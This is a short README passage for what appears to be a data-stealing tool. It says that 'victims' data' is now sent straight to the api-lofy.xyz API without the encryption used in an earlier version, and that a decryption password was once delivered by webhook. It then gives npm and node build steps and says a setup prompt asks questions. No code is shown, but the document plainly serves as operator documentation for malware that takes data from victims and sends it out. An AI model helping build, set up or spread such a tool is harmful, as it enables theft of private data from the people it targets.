### Decrypt Victims Files

* In the previous version, the victims' data were encrypted before being sent to the [api-lofy.xyz](https://api-lofy.xyz) API, and a decryption password was sent via webhook. However, due to recurring issues with data recovery even with the correct password, we have decided to simplify the process.

* Now, the data will be sent directly to the API without additional encryption. If you are not comfortable with this change and prefer to keep the data secure, we recommend not using the code. We understand the concerns about privacy and will continue to look for alternatives to ensure data protection.

### Installation

> Before starting, I need you to install [Visual Studio Installer](https://visualstudio.microsoft.com/pt-br/downloads/) and the Dashboard Development pack with C++.

* 1- first install the modules using `npm run start`
* 2- Finally use `node build.js`
* 3- After opening it, just keep filling in the questions.
